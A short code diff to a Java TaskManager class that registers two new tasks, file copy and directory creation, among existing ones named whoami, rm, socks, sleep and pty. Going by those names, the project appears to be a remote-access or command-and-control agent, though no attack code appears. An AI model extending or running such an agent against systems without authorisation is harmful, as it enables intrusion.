@@ -37,6 +37,8 @@ public class TaskManager {
         registerTask(new CatTask());
         registerTask(new WhoamiTask());
         registerTask(new RmTask());
+        registerTask(new CpTask());
+        registerTask(new MkdirTask());
         registerTask(new SleepTask());
         registerTask(new SocksTask());
         registerTask(new PtyTask());
